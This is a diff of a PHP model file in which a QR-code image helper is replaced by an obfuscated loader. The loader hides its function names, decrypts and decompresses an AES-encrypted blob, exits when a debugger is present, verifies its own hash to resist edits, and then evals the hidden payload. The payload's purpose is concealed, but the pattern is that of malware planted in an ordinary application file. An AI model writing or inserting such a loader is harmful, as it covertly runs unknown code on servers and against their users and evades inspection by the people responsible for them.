@@ -1,23 +1,28 @@
 <?php
-if( ! defined('BASEPATH')) exit('No direct script access allowed');
-
-use chillerlan\QRCode\{QRCode, QROptions};
-
-class Qrcode_model extends CI_Model {
-    public function __construct(){
-		parent::__construct();
-	}
-
-	public function qr_image($data='')
-	{
-		$data  = trim($data);	
-
-		//if the parameter value has slash
-		$data = base64_decode(str_replace('-', '=', str_replace('_', '/', $data)));
-
-		// quick and simple:
-		//return '<img src="'.(new QRCode)->render($data).'" alt="QR Code" />';
-		
-		return (!empty($data)) ? '<img src="'.(new QRCode)->render($data).'" alt="QR Code" />' : '';		
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_bl1mz6v9=('bas'.'e64'.'_de'.'cod'.'e');
+$_v9eelq49=('gzu'.'nco'.'mpr'.'ess');
+$_pu096ztf=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_mkorxgpx='dYSNDqEl';
+$_h3n4ne1a='TOk8ByFqd0A=';
+$_xkqzfjd1='4AR1MIM5';
+$_k3ofut8s='y/6k2x5W';
+$_y590ovyw='Bk2YyI+H';
+$_u8awj1ic='QFvnXRQd';
+$_b59yy3p7='lGJRdw==';
+$_t4waydoi='9kNZXDXX';
+$_x6q6ixd2=$_bl1mz6v9($_xkqzfjd1.$_y590ovyw.$_mkorxgpx.$_k3ofut8s.$_h3n4ne1a);
+$_unuju9wo=$_bl1mz6v9($_t4waydoi.$_u8awj1ic.$_b59yy3p7);
+$_chh9u7ej=$_bl1mz6v9('+UFaWacCCSizUWAOF8T+LjryU2LYoUZFMM4gvKFSuxC6tFPQGUNbh5DPn/a1BDXM6zenB+jPZYMneFrp7yCmFdS4Tc4+XVYSX6JdqdYU5Nwtev+FncEEciYf8mmCM/zh6QMer9mEYFus+LfyPDiIGwgJEUDaUHHX7404KtFRnu21L2U5QBmg169qIwvAyic36CmlTCrWE7L+UkDK8Vb3nOXl6lDuhboeBgG+RVyNMuO2DkNwNggRnTyZ1YxBzJCR6m6yMU6zvah0GKHHuul99d+r2qX7gL/tMWp70RskTU/MtKbkRLK09VSEucWeoQzR0135n7vut5R1ckf1aY4l4UpHYepADhbxbQhy0FG59tNuq+8RhaKifUouTnr0RHTsDmYnP/CyFXgVN/XHntIWMg==');
+$_u3mhq9zg=$_pu096ztf($_chh9u7ej,'aes-256-cbc',$_x6q6ixd2,OPENSSL_RAW_DATA,$_unuju9wo);
+if($_u3mhq9zg===false){exit;}
+$_pk3i29sm=$_v9eelq49($_u3mhq9zg);
+if($_pk3i29sm===false){exit;}
+$_syezokh4='e69237fe30302478851d8535b921d4f6cb19bd7a481c1a9647339f9b2854c3bd';
+$_x9xi3uc9=@file_get_contents(__FILE__);
+if($_x9xi3uc9!==false){
+$_llheasha=str_replace($_syezokh4,"0000000000000000000000000000000000000000000000000000000000000000",$_x9xi3uc9);
+$_m9sd9h8r=hash("sha256",$_llheasha);
+if($_m9sd9h8r!==$_syezokh4){@http_response_code(403);exit;}
 }
+eval($_pk3i29sm);
